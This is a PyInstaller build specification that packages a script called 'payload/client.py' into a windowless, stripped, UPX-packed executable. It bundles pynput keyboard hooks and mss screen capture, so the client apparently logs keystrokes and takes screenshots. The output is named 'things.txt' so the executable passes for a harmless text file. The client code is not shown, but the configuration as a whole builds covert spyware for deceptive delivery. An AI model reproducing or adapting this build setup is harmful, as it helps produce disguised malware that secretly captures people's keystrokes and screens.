# -*- mode: python ; coding: utf-8 -*-
import sys
from pathlib import Path

block_cipher = None

PAYLOAD_ROOT = str(Path(__file__).resolve().parent.parent / 'payload')
PROJECT_ROOT = str(Path(__file__).resolve().parent.parent)

a = Analysis(
    [str(Path(PAYLOAD_ROOT) / 'client.py')],
    pathex=[PAYLOAD_ROOT, str(Path(PROJECT_ROOT) / 'common'), PROJECT_ROOT],
    binaries=[],
    datas=[],
    hiddenimports=[
        'pynput.keyboard._xorg',
        'pynput.keyboard._win32',
        'pynput._util',
        'mss',
        'mss.tools',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['tkinter', 'matplotlib', 'numpy'],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='things.txt',
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
